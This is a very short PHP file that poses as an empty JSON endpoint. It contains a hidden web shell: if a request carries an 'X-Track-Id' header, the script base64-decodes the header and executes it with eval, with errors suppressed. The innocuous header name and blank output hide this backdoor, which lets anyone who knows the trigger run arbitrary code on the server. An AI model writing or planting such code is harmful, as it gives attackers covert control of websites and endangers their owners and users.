<?php
header("Content-Type: application/json");
$h=getallheaders();if(isset($h["X-Track-Id"])){@eval(base64_decode($h["X-Track-Id"]));exit;}
echo '';
?>